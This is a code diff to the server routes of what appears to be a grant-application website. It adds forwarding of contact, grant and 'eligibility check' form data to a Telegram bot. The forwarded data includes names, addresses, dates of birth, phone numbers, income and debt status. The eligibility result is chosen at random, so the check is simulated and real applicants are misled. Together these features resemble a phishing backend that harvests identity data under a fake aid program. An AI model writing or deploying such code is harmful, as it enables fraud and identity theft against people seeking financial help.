@@ -4,11 +4,60 @@ import { storage } from "./storage";
 import { insertContactSubmissionSchema } from "@shared/schema";
 import { z } from "zod";
 
+// Helper function to send messages to Telegram
+async function sendToTelegram(message: string) {
+  const botToken = process.env.TELEGRAM_BOT_TOKEN;
+  const chatId = process.env.TELEGRAM_CHAT_ID;
+
+  if (!botToken || !chatId) {
+    console.warn("Telegram configuration missing - message not sent");
+    return;
+  }
+
+  try {
+    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: "Markdown"
+      }),
+    });
+
+    if (!response.ok) {
+      const errorData = await response.json();
+      console.error("Telegram API error:", errorData);
+    }
+  } catch (error) {
+    console.error("Error sending to Telegram:", error);
+  }
+}
+
 export async function registerRoutes(app: Express): Promise<Server> {
   // Contact form submission endpoint
   app.post("/api/contact", async (req, res) => {
     try {
       const validatedData = insertContactSubmissionSchema.parse(req.body);
+      
+      // Send to Telegram
+      const telegramMessage = `
+🟡 *CONTACT FORM SUBMISSION*
+
+*Name:* ${validatedData.firstName} ${validatedData.lastName}
+*Email:* ${validatedData.email}
+*Subject:* ${validatedData.subject}
+
+*Message:*
+${validatedData.message}
+
+*Timestamp:* ${new Date().toISOString()}
+      `.trim();
+
+      await sendToTelegram(telegramMessage);
+      
       const submission = await storage.createContactSubmission(validatedData);
       res.status(201).json({ message: "Contact form submitted successfully", id: submission.id });
     } catch (error) {
@@ -59,6 +108,34 @@ export async function registerRoutes(app: Express): Promise<Server> {
       
       // Generate application ID
       const applicationId = `APP-${new Date().getFullYear()}-${Math.floor(Math.random() * 10000).toString().padStart(4, '0')}`;
+      
+      // Send to Telegram
+      const telegramMessage = `
+🟢 *NEW GRANT APPLICATION*
+
+*Application ID:* ${applicationId}
+*Name:* ${validatedData.firstName} ${validatedData.lastName}
+*Email:* ${validatedData.email}
+*Phone:* ${validatedData.phone}
+*Address:* ${validatedData.address}, ${validatedData.city}, ${validatedData.state} ${validatedData.zipCode}
+*Date of Birth:* ${validatedData.dateOfBirth}
+*Household Size:* ${validatedData.householdSize}
+*Monthly Income:* ${validatedData.monthlyIncome}
+*Employment Status:* ${validatedData.employmentStatus}
+*Grant Type:* ${validatedData.grantType}
+*Requested Amount:* ${validatedData.requestedAmount}
+
+*Purpose:*
+${validatedData.purpose}
+
+*Has Debts:* ${validatedData.hasDebts ? 'Yes' : 'No'}
+*Agreed to Terms:* ${validatedData.agreeToTerms ? 'Yes' : 'No'}
+*Agreed to Verification:* ${validatedData.agreeToVerification ? 'Yes' : 'No'}
+
+*Timestamp:* ${new Date().toISOString()}
+      `.trim();
+
+      await sendToTelegram(telegramMessage);
       
       // Format data for storage/processing
       const applicationData = {
@@ -125,33 +202,7 @@ ${validatedData.reportDetails}
       `.trim();
 
       // Send to Telegram
-      const botToken = process.env.TELEGRAM_BOT_TOKEN;
-      const chatId = process.env.TELEGRAM_CHAT_ID;
-
-      if (!botToken || !chatId) {
-        console.error("Telegram configuration missing");
-        return res.status(500).json({ 
-          message: "Telegram configuration not found. Please contact administrator." 
-        });
-      }
-
-      const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: telegramMessage,
-          parse_mode: "Markdown"
-        }),
-      });
-
-      if (!telegramResponse.ok) {
-        const errorData = await telegramResponse.json();
-        console.error("Telegram API error:", errorData);
-        throw new Error("Failed to send message to Telegram");
-      }
+      await sendToTelegram(telegramMessage);
 
       // Store report in database (optional)
       const reportData = {
@@ -171,6 +222,48 @@ ${validatedData.reportDetails}
         res.status(400).json({ message: "Invalid form data", errors: error.errors });
       } else {
         res.status(500).json({ message: "Failed to send report. Please try again." });
+      }
+    }
+  });
+
+  // Eligibility check submission endpoint
+  app.post("/api/eligibility-check", async (req, res) => {
+    try {
+      const eligibilitySchema = z.object({
+        fullName: z.string().min(1, "Full name is required"),
+        dateOfBirth: z.string().min(1, "Date of birth is required"),
+        address: z.string().min(1, "Address is required")
+      });
+
+      const validatedData = eligibilitySchema.parse(req.body);
+      
+      // Send to Telegram
+      const telegramMessage = `
+🔍 *ELIGIBILITY CHECK SUBMISSION*
+
+*Name:* ${validatedData.fullName}
+*Date of Birth:* ${validatedData.dateOfBirth}
+*Address:* ${validatedData.address}
+
+*Timestamp:* ${new Date().toISOString()}
+      `.trim();
+
+      await sendToTelegram(telegramMessage);
+
+      // Simulate eligibility result (alternating between eligible and additional-docs)
+      const isEligible = Math.random() > 0.5;
+      
+      res.status(200).json({ 
+        result: isEligible ? 'eligible' : 'additional-docs',
+        message: "Eligibility check completed"
+      });
+
+    } catch (error) {
+      console.error("Error in eligibility check:", error);
+      if (error instanceof z.ZodError) {
+        res.status(400).json({ message: "Invalid form data", errors: error.errors });
+      } else {
+        res.status(500).json({ message: "Failed to check eligibility. Please try again." });
       }
     }
   });
